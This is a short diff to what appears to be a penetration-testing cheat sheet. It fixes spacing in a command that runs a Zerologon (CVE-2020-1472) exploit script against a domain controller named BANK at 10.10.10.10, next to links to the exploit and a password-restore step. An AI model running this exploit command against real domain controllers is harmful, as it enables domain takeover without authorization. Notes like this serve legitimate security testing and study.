@@ -3521,7 +3521,7 @@ https://www.exploit-db.com/exploits/47502
 $ https://github.com/dirkjanm/CVE-2020-1472
 
 # Commands (Exploit)
-$python3 cve-2020-1472-exploit.py BANK 10.10.10.10
+$ python3 cve-2020-1472-exploit.py BANK 10.10.10.10
 
 # Commands (Restore Password)
 $ Get plain_password_hex 
